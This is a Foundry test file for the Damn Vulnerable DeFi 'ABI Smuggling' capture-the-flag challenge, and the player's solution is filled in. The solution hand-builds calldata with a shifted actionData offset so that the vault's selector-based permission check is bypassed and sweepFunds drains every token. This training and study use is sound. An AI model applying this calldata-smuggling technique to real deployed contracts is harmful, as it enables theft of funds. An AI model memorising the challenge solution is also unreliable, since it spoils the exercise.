// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // Prepare payload for bypassing actionData selector
        // Assume we call execute(address target, bytes actionData) function.
        // Our calldata would be as follows:
        // Signature of execute(address,bytes) -> "1cff79cd"
        // target address value -> address(vault)
        // location of actionData -> !! We manipulate this. !!
        //      - Normally it would encode with params and point to 32 * 2 (excluding signature)(points to length)
        //      - Executor code assumes that actionData is presented there. However, if we change location
        //      and fill 4+32*3 with a dummy data (signature of withdraw function, since we are allowed to call it only)
        // So, normally if we would encode data as usual it would be as follows:
        // 
        // signature (1cff79cd) + address (vault) + starting location of actionData (68) + length of actionData (??) + data
        // 
        // Instead we will call vault with following data:
        //
        // 0                      4                 36                    68      100                    132        164
        // signature (1cff79cd) + address (vault) + loc. act.Data (128) + empty + dummy (d9caed12 ...) + len (??) + actionData

        // Solution.
        // Prepare actionData first. -> call sweepFunds(recovery, DVT token)
        bytes4 execute_sign = 0x1cff79cd;
        bytes32 vault_address = bytes32(abi.encode(address(vault))); // Address has to be right-aligned
        bytes32 action_data_location = bytes32(uint256(128));
        bytes32 empty = bytes32(0);
        bytes32 dummy = 0xd9caed12f81c440f63c9677a4301dff8e874a7abd93e3ecd0aaea4ffa129d9fb;
        bytes memory action_data = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));
        bytes32 len_action_data = bytes32(action_data.length);

        // Bring together each part to construct payload 
        //bytes memory original_payload = abi.encodeWithSignature("execute(address,bytes)", address(vault), action_data);
        bytes memory exploit_payload = bytes.concat(execute_sign, vault_address, action_data_location, empty, dummy, len_action_data, action_data);
        
        //console.logString("original payload");
        //console.logBytes(original_payload);
        //console.logString("exploit_payload");
        //console.logBytes(exploit_payload);
        address(vault).call(exploit_payload);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
